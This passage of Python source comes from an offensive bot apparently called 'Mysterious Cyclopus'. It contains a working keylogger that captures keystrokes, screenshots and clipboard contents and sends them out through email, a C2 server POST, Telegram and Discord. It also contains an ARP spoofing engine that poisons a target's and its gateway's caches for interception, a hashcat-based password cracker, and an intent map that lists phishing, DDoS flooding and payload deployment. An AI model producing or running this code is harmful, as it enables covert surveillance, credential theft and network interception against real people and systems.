            logger.info(f"Saved {len(self.text)} keylog characters")
    
    def _take_screenshot(self) -> str:
        try:
            import pyautogui
            timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
            screenshot_path = os.path.join(REPORT_DIR, f"screenshot_{timestamp}.png")
            screenshot = pyautogui.screenshot()
            screenshot.save(screenshot_path)
            logger.info(f"Screenshot saved: {screenshot_path}")
            return screenshot_path
        except:
            return ""
    
    def _monitor_clipboard(self):
        if not self.running:
            return
        
        try:
            import pyperclip
            current = pyperclip.paste()
            if current and current != self.last_clipboard:
                self.last_clipboard = current
                self.db.save_clipboard(current, "keylogger")
                logger.info(f"Clipboard captured: {current[:100]}...")
                self._exfiltrate_clipboard(current)
        except:
            pass
        
        if self.running:
            self.clipboard_timer = threading.Timer(5, self._monitor_clipboard)
            self.clipboard_timer.daemon = True
            self.clipboard_timer.start()
    
    def _exfiltrate_data(self, text: str, screenshot_path: str = ""):
        for method in self.exfil_methods:
            try:
                if method == "file":
                    self._exfil_file(text, screenshot_path)
                elif method == "email":
                    self._exfil_email(text, screenshot_path)
                elif method == "c2":
                    self._exfil_c2(text, screenshot_path)
                elif method == "telegram":
                    self._exfil_telegram(text, screenshot_path)
                elif method == "discord":
                    self._exfil_discord(text, screenshot_path)
            except Exception as e:
                logger.error(f"Exfil via {method} failed: {e}")
    
    def _exfil_file(self, text: str, screenshot_path: str):
        try:
            timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = os.path.join(REPORT_DIR, f"exfil_{timestamp}.txt")
            with open(filename, 'w') as f:
                f.write(f"[{timestamp}]\n{text}\n")
                if screenshot_path:
                    f.write(f"\nScreenshot: {screenshot_path}\n")
            logger.info(f"Exfil saved to file: {filename}")
        except:
            pass
    
    def _exfil_email(self, text: str, screenshot_path: str):
        try:
            smtp_server = self.config.get('email.smtp_server', '')
            smtp_port = self.config.get('email.smtp_port', 587)
            smtp_username = self.config.get('email.smtp_username', '')
            smtp_password = self.config.get('email.smtp_password', '')
            to_email = self.config.get('keylogger.email_recipient', '')
            
            if not all([smtp_server, smtp_username, smtp_password, to_email]):
                return
            
            msg = email.message.EmailMessage()
            msg['Subject'] = f"Keylog Data - {datetime.datetime.now().isoformat()}"
            msg['From'] = smtp_username
            msg['To'] = to_email
            msg.set_content(f"Keylog Data:\n\n{text}")
            
            if screenshot_path and os.path.exists(screenshot_path):
                with open(screenshot_path, 'rb') as f:
                    msg.add_attachment(f.read(), maintype='image', subtype='png', filename=os.path.basename(screenshot_path))
            
            with smtplib.SMTP(smtp_server, smtp_port) as server:
                server.starttls()
                server.login(smtp_username, smtp_password)
                server.send_message(msg)
            
            logger.info("Keylog exfiltrated via email")
        except:
            pass
    
    def _exfil_c2(self, text: str, screenshot_path: str):
        if not self.c2_server:
            return
        try:
            data = {
                'timestamp': datetime.datetime.now().isoformat(),
                'text': text,
                'hostname': socket.gethostname(),
                'window': self.current_window
            }
            if screenshot_path:
                data['screenshot'] = base64.b64encode(open(screenshot_path, 'rb').read()).decode()
            
            requests.post(self.c2_server, json=data, timeout=10)
            logger.info("Keylog exfiltrated via C2")
        except:
            pass
    
    def _exfil_telegram(self, text: str, screenshot_path: str):
        try:
            if self.telegram_bot:
                self.telegram_bot.send_message(f"🐙 Keylog Data:\n\n{text[:3000]}")
                if screenshot_path:
                    self.telegram_bot.send_photo(screenshot_path)
        except:
            pass
    
    def _exfil_discord(self, text: str, screenshot_path: str):
        try:
            if self.discord_bot:
                self.discord_bot.send_message(f"🐙 Keylog Data:\n```\n{text[:1900]}\n```")
                if screenshot_path:
                    self.discord_bot.send_file(screenshot_path)
        except:
            pass
    
    def _exfiltrate_clipboard(self, text: str):
        for method in self.exfil_methods:
            try:
                if method == "file":
                    self._exfil_file(f"CLIPBOARD: {text}", "")
                elif method == "email":
                    self._exfil_email(f"CLIPBOARD: {text}", "")
                elif method == "c2":
                    self._exfil_c2(f"CLIPBOARD: {text}", "")
            except:
                pass
    
    def _upload_keylog(self):
        if self.text:
            self._save_keylog()
            self.text = ""
        
        if self.running:
            self.upload_timer = threading.Timer(self.upload_interval, self._upload_keylog)
            self.upload_timer.daemon = True
            self.upload_timer.start()
    
    def get_keylogs(self, limit: int = 100):
        return self.db.get_keylogs(limit)
    
    def get_screenshots(self) -> List[str]:
        try:
            return [f for f in os.listdir(REPORT_DIR) if f.startswith('screenshot_')]
        except:
            return []
    
    def set_telegram_bot(self, bot):
        self.telegram_bot = bot
    
    def set_discord_bot(self, bot):
        self.discord_bot = bot

# =====================
# ARP SPOOFING ENGINE
# =====================
class ARPSpoofingEngine:
    def __init__(self, db: DatabaseManager, config: ConfigManager):
        self.db = db
        self.config = config
        self.running = False
        self.active_spoofs = {}
        self.interface = config.get('arp_spoofing.interface', 'eth0')
        self.enable_ip_forward = config.get('arp_spoofing.enable_ip_forward', True)
        self.stop_events = {}
    
    def start_spoof(self, target_ip: str, gateway_ip: str, interface: str = None) -> ARPSpoofResult:
        if not SCAPY_AVAILABLE:
            return ARPSpoofResult(
                target_ip=target_ip,
                gateway_ip=gateway_ip,
                interface=interface or self.interface,
                status="failed",
                packets_sent=0,
                duration=0.0,
                started_at=datetime.datetime.now().isoformat(),
                ended_at=datetime.datetime.now().isoformat()
            )
        
        try:
            ipaddress.ip_address(target_ip)
            ipaddress.ip_address(gateway_ip)
        except ValueError:
            return ARPSpoofResult(
                target_ip=target_ip,
                gateway_ip=gateway_ip,
                interface=interface or self.interface,
                status="failed",
                packets_sent=0,
                duration=0.0,
                started_at=datetime.datetime.now().isoformat(),
                ended_at=datetime.datetime.now().isoformat()
            )
        
        if self.enable_ip_forward:
            self._enable_ip_forward()
        
        self.db.add_arp_spoof(target_ip, gateway_ip, interface or self.interface)
        
        spoof_id = f"{target_ip}_{gateway_ip}_{int(time.time())}"
        stop_event = threading.Event()
        self.stop_events[spoof_id] = stop_event
        
        thread = threading.Thread(
            target=self._run_spoof,
            args=(spoof_id, target_ip, gateway_ip, interface or self.interface, stop_event),
            daemon=True
        )
        thread.start()
        
        self.active_spoofs[spoof_id] = {
            'target_ip': target_ip,
            'gateway_ip': gateway_ip,
            'interface': interface or self.interface,
            'start_time': datetime.datetime.now().isoformat(),
            'status': 'running'
        }
        
        return ARPSpoofResult(
            target_ip=target_ip,
            gateway_ip=gateway_ip,
            interface=interface or self.interface,
            status="running",
            packets_sent=0,
            duration=0.0,
            started_at=datetime.datetime.now().isoformat(),
            ended_at=""
        )
    
    def _run_spoof(self, spoof_id: str, target_ip: str, gateway_ip: str,
                   interface: str, stop_event: threading.Event):
        try:
            from scapy.all import ARP, Ether, send, srp
            
            target_mac = self._get_mac(target_ip, interface)
            gateway_mac = self._get_mac(gateway_ip, interface)
            
            if not target_mac or not gateway_mac:
                self._update_spoof_status(spoof_id, "failed", 0, 0)
                return
            
            packets_sent = 0
            start_time = time.time()
            
            while not stop_event.is_set():
                packet1 = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
                send(packet1, verbose=False)
                
                packet2 = ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip)
                send(packet2, verbose=False)
                
                packets_sent += 2
                time.sleep(1)
            
            duration = time.time() - start_time
            self._update_spoof_status(spoof_id, "completed", packets_sent, duration)
            
        except Exception as e:
            logger.error(f"ARP spoofing error: {e}")
            self._update_spoof_status(spoof_id, "failed", 0, 0)
    
    def _get_mac(self, ip: str, interface: str) -> Optional[str]:
        try:
            from scapy.all import ARP, Ether, srp
            arp_request = ARP(pdst=ip)
            broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
            arp_request_broadcast = broadcast / arp_request
            answered, _ = srp(arp_request_broadcast, timeout=2, iface=interface, verbose=False)
            if answered:
                return answered[0][1].hwsrc
            return None
        except:
            return None
    
    def _update_spoof_status(self, spoof_id: str, status: str, packets_sent: int, duration: float):
        if spoof_id in self.active_spoofs:
            spoof = self.active_spoofs[spoof_id]
            self.db.update_arp_spoof(
                spoof['target_ip'],
                spoof['gateway_ip'],
                packets_sent,
                duration,
                datetime.datetime.now().isoformat()
            )
            spoof['status'] = status
            if status == 'completed' or status == 'failed':
                if spoof_id in self.stop_events:
                    del self.stop_events[spoof_id]
                del self.active_spoofs[spoof_id]
    
    def _enable_ip_forward(self):
        try:
            if platform.system().lower() == 'linux':
                with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
                    f.write('1')
            elif platform.system().lower() == 'windows':
                subprocess.run(
                    ['reg', 'add', 'HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters',
                     '/v', 'IPEnableRouter', '/t', 'REG_DWORD', '/d', '1', '/f'],
                    capture_output=True
                )
        except Exception as e:
            logger.error(f"Failed to enable IP forwarding: {e}")
    
    def stop_spoof(self, spoof_id: str = None) -> bool:
        if spoof_id:
            if spoof_id in self.stop_events:
                self.stop_events[spoof_id].set()
                return True
        else:
            for event in self.stop_events.values():
                event.set()
            return True
        return False
    
    def get_active_spoofs(self) -> List[Dict]:
        return [
            {
                'id': sid,
                'target_ip': spoof['target_ip'],
                'gateway_ip': spoof['gateway_ip'],
                'interface': spoof['interface'],
                'status': spoof['status'],
                'start_time': spoof['start_time']
            }
            for sid, spoof in self.active_spoofs.items()
        ]
    
    def get_spoof_history(self, limit: int = 20) -> List[Dict]:
        return self.db.get_arp_spoofs()

# =====================
# MAC ADDRESS MANAGER
# =====================
class MACManager:
    def __init__(self, db: DatabaseManager):
        self.db = db
        self.vendor_cache = {}
    
    def get_mac_info(self, mac_address: str) -> Dict:
        mac = mac_address.upper()
        mac = mac.replace('-', ':')
        mac = mac.replace('.', ':')
        
        vendor = self._get_vendor(mac)
        ip = self._get_ip_from_mac(mac)
        hostname = None
        if ip:
            try:
                hostname = socket.gethostbyaddr(ip)[0]
            except:
                pass
        
        self.db.add_mac_info(mac, vendor, ip, hostname)
        
        return {
            'mac_address': mac,
            'vendor': vendor or 'Unknown',
            'ip_address': ip or 'Unknown',
            'hostname': hostname or 'Unknown',
            'first_seen': datetime.datetime.now().isoformat(),
            'last_seen': datetime.datetime.now().isoformat()
        }
    
    def _get_vendor(self, mac: str) -> Optional[str]:
        prefix = mac[:8].upper().replace(':', '')
        
        if prefix in self.vendor_cache:
            return self.vendor_cache[prefix]
        
        try:
            response = requests.get(
                f"https://api.macvendors.com/{mac}",
                timeout=5
            )
            if response.status_code == 200:
                vendor = response.text.strip()
                self.vendor_cache[prefix] = vendor
                return vendor
        except:
            pass
        
        return None
    
    def _get_ip_from_mac(self, mac: str) -> Optional[str]:
        try:
            if platform.system().lower() == 'linux':
                result = subprocess.run(
                    ['arp', '-n'],
                    capture_output=True,
                    text=True,
                    timeout=5
                )
                for line in result.stdout.split('\n'):
                    if mac.lower() in line.lower():
                        parts = line.split()
                        if len(parts) >= 1:
                            return parts[0]
            elif platform.system().lower() == 'windows':
                result = subprocess.run(
                    ['arp', '-a'],
                    capture_output=True,
                    text=True,
                    timeout=5
                )
                for line in result.stdout.split('\n'):
                    if mac in line:
                        parts = line.split()
                        if len(parts) >= 1:
                            return parts[0]
        except:
            pass
        return None
    
    def scan_network(self, network: str = None) -> List[Dict]:
        if not SCAPY_AVAILABLE:
            return []
        
        if not network:
            local_ip = self._get_local_ip()
            network = f"{local_ip}/24"
        
        results = []
        try:
            from scapy.all import ARP, Ether, srp
            
            arp = ARP(pdst=network)
            ether = Ether(dst="ff:ff:ff:ff:ff:ff")
            packet = ether / arp
            
            answered, _ = srp(packet, timeout=2, verbose=False)
            
            for sent, received in answered:
                mac = received.hwsrc
                ip = received.psrc
                vendor = self._get_vendor(mac)
                self.db.add_mac_info(mac, vendor, ip, None)
                
                results.append({
                    'mac_address': mac,
                    'ip_address': ip,
                    'vendor': vendor or 'Unknown'
                })
        except Exception as e:
            logger.error(f"Network scan error: {e}")
        
        return results
    
    def _get_local_ip(self) -> str:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "192.168.1.1"

# =====================
# NAT INFORMATION ENGINE
# =====================
class NATInfoEngine:
    def __init__(self, db: DatabaseManager):
        self.db = db
    
    def get_nat_info(self) -> NATInfo:
        public_ip = self._get_public_ip()
        private_ip = self._get_private_ip()
        router_ip = self._get_router_ip()
        location = self._get_location(public_ip) if public_ip else {}
        
        nat_info = NATInfo(
            public_ip=public_ip or 'Unknown',
            private_ip=private_ip or 'Unknown',
            router_ip=router_ip or 'Unknown',
            country=location.get('country', 'Unknown'),
            isp=location.get('isp', 'Unknown'),
            nat_type=self._detect_nat_type()
        )
        
        self.db.add_nat_info(
            nat_info.public_ip,
            nat_info.private_ip,
            nat_info.router_ip,
            nat_info.country,
            nat_info.isp,
            nat_info.nat_type
        )
        
        return nat_info
    
    def _get_public_ip(self) -> Optional[str]:
        try:
            response = requests.get('https://api.ipify.org', timeout=5)
            if response.status_code == 200:
                return response.text.strip()
        except:
            pass
        
        try:
            response = requests.get('http://icanhazip.com', timeout=5)
            if response.status_code == 200:
                return response.text.strip()
        except:
            pass
        
        return None
    
    def _get_private_ip(self) -> Optional[str]:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return None
    
    def _get_router_ip(self) -> Optional[str]:
        try:
            if platform.system().lower() == 'linux':
                result = subprocess.run(
                    ['ip', 'route', 'show', 'default'],
                    capture_output=True,
                    text=True,
                    timeout=5
                )
                for line in result.stdout.split('\n'):
                    if 'default' in line:
                        parts = line.split()
                        if len(parts) >= 3:
                            return parts[2]
            elif platform.system().lower() == 'windows':
                result = subprocess.run(
                    ['ipconfig'],
                    capture_output=True,
                    text=True,
                    timeout=5
                )
                for line in result.stdout.split('\n'):
                    if 'Default Gateway' in line:
                        parts = line.split(':')
                        if len(parts) >= 2:
                            return parts[1].strip()
        except:
            pass
        return None
    
    def _get_location(self, ip: str) -> Dict:
        try:
            response = requests.get(f"http://ip-api.com/json/{ip}", timeout=5)
            if response.status_code == 200:
                data = response.json()
                if data.get('status') == 'success':
                    return {
                        'country': data.get('country', 'Unknown'),
                        'city': data.get('city', 'Unknown'),
                        'isp': data.get('isp', 'Unknown'),
                        'lat': data.get('lat', 0),
                        'lon': data.get('lon', 0)
                    }
        except:
            pass
        return {}
    
    def _detect_nat_type(self) -> str:
        public_ip = self._get_public_ip()
        private_ip = self._get_private_ip()
        
        if public_ip and private_ip and public_ip != private_ip:
            return 'Full Cone NAT'
        elif public_ip and private_ip and public_ip == private_ip:
            return 'No NAT (Public IP)'
        else:
            return 'Unknown NAT Type'

# =====================
# CRACKING ENGINE
# =====================
class CrackingEngine:
    def __init__(self, db: DatabaseManager, config: ConfigManager):
        self.db = db
        self.config = config
        self.running_jobs = {}
        self.hashcat_path = config.get('cracking.hashcat_path', 'hashcat')
        self.wordlist_path = config.get('cracking.wordlist_path', '/usr/share/wordlists/rockyou.txt')
    
    def crack_hash(self, hash_type: str, hash_value: str, wordlist: str = None) -> str:
        job_id = str(uuid.uuid4())[:8]
        wordlist = wordlist or self.wordlist_path
        
        self.db.save_cracking_job(job_id, hash_type, hash_value, wordlist)
        
        thread = threading.Thread(target=self._run_hashcat, args=(job_id, hash_type, hash_value, wordlist))
        thread.daemon = True
        thread.start()
        
        return job_id
    
    def _run_hashcat(self, job_id: str, hash_type: str, hash_value: str, wordlist: str):
        self.db.update_cracking_job(job_id, 'running')
        
        try:
            hash_type_num = self._get_hash_type_num(hash_type)
            
            cmd = [
                self.hashcat_path,
                '-m', str(hash_type_num),
                '-a', '0',
                '-o', os.path.join(CRACKING_DIR, f"{job_id}_result.txt"),
                '--potfile-path', os.path.join(CRACKING_DIR, f"{job_id}.pot"),
                hash_value,
                wordlist
            ]
            
            if not shutil.which(self.hashcat_path):
                result = self._crack_with_python(hash_type, hash_value, wordlist)
                if result:
                    self.db.update_cracking_job(job_id, 'completed', result, True)
                else:
                    self.db.update_cracking_job(job_id, 'failed', 'No match found', False)
                return
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            
            result_file = os.path.join(CRACKING_DIR, f"{job_id}_result.txt")
            if os.path.exists(result_file):
                with open(result_file, 'r') as f:
                    content = f.read().strip()
                    if ':' in content:
                        cracked = content.split(':', 1)[1]
                        self.db.update_cracking_job(job_id, 'completed', cracked, True)
                    else:
                        self.db.update_cracking_job(job_id, 'completed', content, True)
            else:
                self.db.update_cracking_job(job_id, 'failed', 'No result found', False)
                
        except subprocess.TimeoutExpired:
            self.db.update_cracking_job(job_id, 'failed', 'Timeout', False)
        except Exception as e:
            self.db.update_cracking_job(job_id, 'failed', str(e), False)
    
    def _get_hash_type_num(self, hash_type: str) -> int:
        hash_types = {
            'md5': 0,
            'sha1': 100,
            'sha256': 1400,
            'sha512': 1700,
            'ntlm': 1000,
            'mysql': 200,
            'mysql5': 300,
            'postgres': 12,
            'mssql': 131,
            'bcrypt': 3200,
        }
        return hash_types.get(hash_type.lower(), 0)
    
    def _crack_with_python(self, hash_type: str, hash_value: str, wordlist: str) -> Optional[str]:
        try:
            with open(wordlist, 'r', encoding='utf-8', errors='ignore') as f:
                for word in f:
                    word = word.strip()
                    if not word:
                        continue
                    
                    if hash_type.lower() == 'md5':
                        if hashlib.md5(word.encode()).hexdigest() == hash_value:
                            return word
                    elif hash_type.lower() == 'sha1':
                        if hashlib.sha1(word.encode()).hexdigest() == hash_value:
                            return word
                    elif hash_type.lower() == 'sha256':
                        if hashlib.sha256(word.encode()).hexdigest() == hash_value:
                            return word
                    elif hash_type.lower() == 'sha512':
                        if hashlib.sha512(word.encode()).hexdigest() == hash_value:
                            return word
            return None
        except:
            return None
    
    def get_job_status(self, job_id: str) -> Optional[Dict]:
        jobs = self.db.get_cracking_jobs()
        for job in jobs:
            if job['job_id'] == job_id:
                return dict(job)
        return None
    
    def get_all_jobs(self) -> List[Dict]:
        return self.db.get_cracking_jobs()

# =====================
# DOCKER SCANNER
# =====================
class DockerScanner:
    def __init__(self, db: DatabaseManager):
        self.db = db
    
    def scan_image(self, image: str) -> Dict:
        start_time = time.time()
        try:
            result = subprocess.run(['docker', 'scan', image], capture_output=True, text=True, timeout=300)
            scan_time = time.time() - start_time
            
            vulnerabilities = self._parse_vulnerabilities(result.stdout)
            severity = self._determine_severity(vulnerabilities)
            
            self.db.save_docker_scan(image, vulnerabilities, severity, scan_time, result.returncode == 0)
            
            return {
                'success': result.returncode == 0,
                'image': image,
                'vulnerabilities': vulnerabilities,
                'severity': severity,
                'scan_time': scan_time,
                'output': result.stdout[:2000]
            }
        except subprocess.TimeoutExpired:
            return {'success': False, 'error': 'Scan timed out', 'image': image}
        except Exception as e:
            return {'success': False, 'error': str(e), 'image': image}
    
    def _parse_vulnerabilities(self, output: str) -> List[Dict]:
        vulns = []
        for line in output.split('\n'):
            if 'HIGH' in line or 'CRITICAL' in line or 'MEDIUM' in line:
                parts = line.split()
                severity = 'high' if 'HIGH' in line else 'critical' if 'CRITICAL' in line else 'medium'
                vulns.append({'severity': severity, 'description': line.strip()})
        return vulns
    
    def _determine_severity(self, vulnerabilities: List[Dict]) -> str:
        if any(v.get('severity') == 'critical' for v in vulnerabilities):
            return 'critical'
        if any(v.get('severity') == 'high' for v in vulnerabilities):
            return 'high'
        if vulnerabilities:
            return 'medium'
        return 'low'
    
    def docker_info(self) -> Dict:
        result = subprocess.run(['docker', 'info'], capture_output=True, text=True, timeout=30)
        return {'success': result.returncode == 0, 'output': result.stdout}
    
    def docker_ps(self) -> Dict:
        result = subprocess.run(['docker', 'ps'], capture_output=True, text=True, timeout=30)
        return {'success': result.returncode == 0, 'output': result.stdout}
    
    def docker_images(self) -> Dict:
        result = subprocess.run(['docker', 'images'], capture_output=True, text=True, timeout=30)
        return {'success': result.returncode == 0, 'output': result.stdout}

# =====================
# EMAIL COMPOSER ENGINE
# =====================
class EmailComposerEngine:
    def __init__(self, db: DatabaseManager, config: ConfigManager):
        self.db = db
        self.config = config
        self.smtp_server = config.get('email.smtp_server', '')
        self.smtp_port = config.get('email.smtp_port', 587)
        self.smtp_username = config.get('email.smtp_username', '')
        self.smtp_password = config.get('email.smtp_password', '')
        self.from_email = config.get('email.from_email', '')
        self.tls = config.get('email.tls', True)
    
    def compose_email(self, to: str, subject: str, body: str, 
                      from_email: str = None, html: bool = False,
                      attachments: List[str] = None) -> EmailMessage:
        email_msg = EmailMessage(
            to=to,
            subject=subject,
            body=body,
            from_email=from_email or self.from_email,
            attachments=attachments or [],
            html=html,
            status="draft"
        )
        self.db.save_email(email_msg)
        return email_msg
    
    def send_email(self, email_id: int) -> Dict[str, Any]:
        emails = self.db.get_emails(limit=100)
        email_data = next((e for e in emails if e['id'] == email_id), None)
        
        if not email_data:
            return {'success': False, 'error': f'Email {email_id} not found'}
        
        if email_data['status'] == 'sent':
            return {'success': False, 'error': 'Email already sent'}
        
        if not self.smtp_server or not self.smtp_username or not self.smtp_password:
            return {'success': False, 'error': 'SMTP server not configured'}
        
        try:
            msg = MIMEMultipart()
            msg['From'] = email_data['from_address']
            msg['To'] = email_data['to_address']
            msg['Subject'] = email_data['subject']
            
            if email_data['html']:
                msg.attach(MIMEText(email_data['body'], 'html'))
            else:
                msg.attach(MIMEText(email_data['body'], 'plain'))
            
            attachments = json.loads(email_data['attachments']) if email_data['attachments'] else []
            for attachment_path in attachments:
                if os.path.exists(attachment_path):
                    with open(attachment_path, 'rb') as f:
                        part = MIMEBase('application', 'octet-stream')
                        part.set_payload(f.read())
                        encoders.encode_base64(part)
                        part.add_header(
                            'Content-Disposition',
                            f'attachment; filename={os.path.basename(attachment_path)}'
                        )
                        msg.attach(part)
            
            with smtplib.SMTP(self.smtp_server, self.smtp_port) as server:
                if self.tls:
                    server.starttls()
                server.login(self.smtp_username, self.smtp_password)
                server.send_message(msg)
            
            self.db.conn.execute(
                "UPDATE email_messages SET status = 'sent', sent_at = CURRENT_TIMESTAMP WHERE id = ?",
                (email_id,)
            )
            self.db.conn.commit()
            
            return {
                'success': True,
                'message': f'Email sent to {email_data["to_address"]}',
                'email_id': email_id
            }
            
        except Exception as e:
            self.db.conn.execute(
                "UPDATE email_messages SET status = 'failed' WHERE id = ?",
                (email_id,)
            )
            self.db.conn.commit()
            return {'success': False, 'error': str(e)}
    
    def get_emails(self, status: str = None, limit: int = 50) -> List[Dict]:
        return self.db.get_emails(status, limit)

# =====================
# PDF REPORT GENERATOR
# =====================
class PDFReportGenerator:
    def __init__(self, db: DatabaseManager, config: ConfigManager):
        self.db = db
        self.config = config
        self.pdf_available = PDF_AVAILABLE
    
    def generate_report(self, title: str, target: str, analysis: Dict) -> Dict[str, Any]:
        if not self.pdf_available:
            return {'success': False, 'error': 'PDF generation not available (reportlab missing)'}
        
        try:
            timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"cyclopus_report_{target}_{timestamp}.pdf"
            filepath = os.path.join(PDF_REPORTS_DIR, filename)
            
            doc = SimpleDocTemplate(
                filepath,
                pagesize=A4,
                rightMargin=72,
                leftMargin=72,
                topMargin=72,
                bottomMargin=72
            )
            
            styles = getSampleStyleSheet()
            title_style = ParagraphStyle(
                'CustomTitle',
                parent=styles['Heading1'],
                fontSize=24,
                textColor=colors.HexColor('#FF7A1A'),
                alignment=0,
                spaceAfter=30
            )
            
            story = []
            
            story.append(Paragraph(f"🐙 Mysterious Cyclopus Security Report", title_style))
            story.append(Paragraph(f"Title: {title}", styles['Heading2']))
            story.append(Paragraph(f"Target: {target}", styles['Normal']))
            story.append(Paragraph(f"Generated: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}", styles['Normal']))
            story.append(Spacer(1, 20))
            
            story.append(Paragraph("Executive Summary", styles['Heading2']))
            summary = f"This report presents a comprehensive security analysis of <b>{target}</b>."
            story.append(Paragraph(summary, styles['Normal']))
            story.append(Spacer(1, 12))
            
            for key, value in analysis.items():
                if isinstance(value, dict):
                    story.append(Paragraph(key.replace('_', ' ').title(), styles['Heading3']))
                    for sub_key, sub_value in value.items():
                        if not isinstance(sub_value, (dict, list)):
                            story.append(Paragraph(f"• {sub_key.replace('_', ' ').title()}: {sub_value}", styles['Normal']))
                    story.append(Spacer(1, 10))
            
            if 'recommendations' in analysis:
                story.append(Paragraph("Recommendations", styles['Heading2']))
                for rec in analysis['recommendations']:
                    story.append(Paragraph(f"• {rec}", styles['Normal']))
            
            story.append(Spacer(1, 30))
            story.append(Paragraph(
                f"Report generated by Mysterious Cyclopus Bot v{VERSION} | {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
                styles['Italic']
            ))
            
            doc.build(story)
            
            report = PDFReport(
                title=title,
                target=target,
                analysis=analysis,
                timestamp=datetime.datetime.now().isoformat(),
                file_path=filepath,
                status="generated"
            )
            self.db.save_pdf_report(report)
            
            return {
                'success': True,
                'file_path': filepath,
                'message': f'PDF report generated: {filename}'
            }
            
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def get_reports(self, limit: int = 20) -> List[Dict]:
        return self.db.get_pdf_reports(limit)

# =====================
# TRANSFORMER ENGINE
# =====================
class TransformerEngine:
    def __init__(self, config: ConfigManager):
        self.config = config
        self.max_input_length = config.get('transformer.max_input_length', 1000)
        self.cache_size = config.get('transformer.cache_size', 100)
        self.command_cache = {}
        self.intent_patterns = {
            'ping': ['ping', 'pong', 'reach', 'connectivity', 'icmp'],
            'scan': ['scan', 'nmap', 'port', 'vulnerability', 'discover', 'probe'],
            'ssh': ['ssh', 'secure shell', 'remote', 'shell', 'connect'],
            'traffic': ['traffic', 'generate', 'flood', 'dos', 'ddos', 'attack'],
            'phishing': ['phish', 'fake', 'clone', 'credentials', 'capture', 'phishing'],
            'crack': ['crack', 'hash', 'password', 'brute', 'force', 'decrypt'],
            'arp': ['arp', 'spoof', 'poison', 'redirect', 'arp'],
            'keylogger': ['keylog', 'logger', 'keystroke', 'capture', 'keyboard'],
            'ip': ['ip', 'address', 'network', 'block', 'unblock', 'firewall'],
            'mac': ['mac', 'address', 'vendor', 'oui', 'mac'],
            'nat': ['nat', 'translation', 'public', 'private', 'gateway'],
            'system': ['system', 'status', 'info', 'memory', 'cpu', 'process'],
            'deploy': ['deploy', 'deployment', 'payload', 'deliver', 'execute'],
            'domain': ['domain', 'host', 'dns', 'record', 'name', 'website'],
            'monitor': ['monitor', 'watch', 'observe', 'track', 'sniff'],
            'agent': ['agent', 'bot', 'automation', 'schedule', 'task'],
            'report': ['report', 'log', 'history', 'analytics', 'stats'],
            'email': ['email', 'mail', 'compose', 'send', 'message'],
            'docker': ['docker', 'container', 'image', 'scan', 'benchmark'],
            'curl': ['curl', 'http', 'request', 'post', 'get'],
            'netcat': ['netcat', 'nc', 'connect', 'listen'],
            'traceroute': ['traceroute', 'tracert', 'route', 'hop'],
            'whois': ['whois', 'domain', 'registrar', 'dns'],
            'dns': ['dns', 'dig', 'nslookup', 'resolve'],
            'wget': ['wget', 'download', 'fetch', 'get'],
            'help': ['help', '?', 'guide', 'manual', 'docs']
        }
        self.processed_commands = deque(maxlen=self.cache_size)
    
    def process_input(self, input_text: str) -> Dict:
        input_text = input_text.strip().lower()
        
        if input_text in self.command_cache:
            return self.command_cache[input_text]
        
        tokens = input_text.split()
        if not tokens:
            return {'command': 'help', 'confidence': 1.0, 'tokens': []}
        
        intent = self._detect_intent(input_text, tokens)
        params = self._extract_parameters(input_text, tokens)
        
        result = {
            'command': intent,
            'confidence': self._calculate_confidence(input_text, intent),
            'tokens': tokens,
            'params': params,
            'original': input_text
        }
        
        if len(self.processed_commands) < self.cache_size:
            self.command_cache[input_text] = result
            self.processed_commands.append(input_text)
        
        return result
    
    def _detect_intent(self, text: str, tokens: List[str]) -> str:
        for intent, patterns in self.intent_patterns.items():
            for pattern in patterns:
                if pattern in text:
                    return intent
        return 'unknown'
    
    def _extract_parameters(self, text: str, tokens: List[str]) -> Dict:
        params = {}
        
        ip_pattern = r'\b(?:\d{1,3}\.){3}\d{1,3}\b'
        ips = re.findall(ip_pattern, text)
        if ips:
            params['ip'] = ips[0]
            if len(ips) > 1:
                params['ip_list'] = ips
        
        domain_pattern = r'\b(?:[a-zA-Z0-9-]+\.)+[a-zA-Z]{2,}\b'
        domains = re.findall(domain_pattern, text)
        if domains:
            params['domain'] = domains[0]
        
        number_pattern = r'\b\d+\b'
        numbers = re.findall(number_pattern, text)
        if numbers:
            params['numbers'] = [int(n) for n in numbers]
        
        port_pattern = r'(?:port|p)\s*[:=]?\s*(\d+)'
        port_match = re.search(port_pattern, text)
        if port_match:
            params['port'] = int(port_match.group(1))
        
        return params
    
    def _calculate_confidence(self, text: str, intent: str) -> float:
        if intent == 'unknown':
            return 0.0
        
        patterns = self.intent_patterns.get(intent, [])
        matches = sum(1 for pattern in patterns if pattern in text)
        if matches == 0:
            return 0.0
        
        confidence = matches / len(patterns)
        text_length = len(text)
        if text_length > 50:
            confidence *= 0.9
        elif text_length < 10:
            confidence *= 0.8
        
        return min(1.0, confidence)
    
    def generate_response(self, processed: Dict, command_result: Dict) -> Dict:
        if not processed or not command_result:
            return command_result
        
        output = command_result.get('output', '')
        intent = processed.get('command', 'unknown')
        
        contextual = {
            'ping': '🏓 Ping completed successfully',
            'scan': '🔍 Scan completed successfully',
            'ssh': '🔌 SSH connection established',
            'traffic': '🚀 Traffic generated successfully',
            'phishing': '🎣 Phishing link generated',
            'crack': '🔓 Crack completed',
            'arp': '🕸️ ARP spoofing completed',
            'keylogger': '⌨️ Keylogger started',
            'ip': '🔒 IP management completed',
            'mac': '📡 MAC address information',
            'nat': '🌐 NAT information retrieved',
            'system': '💻 System information retrieved',
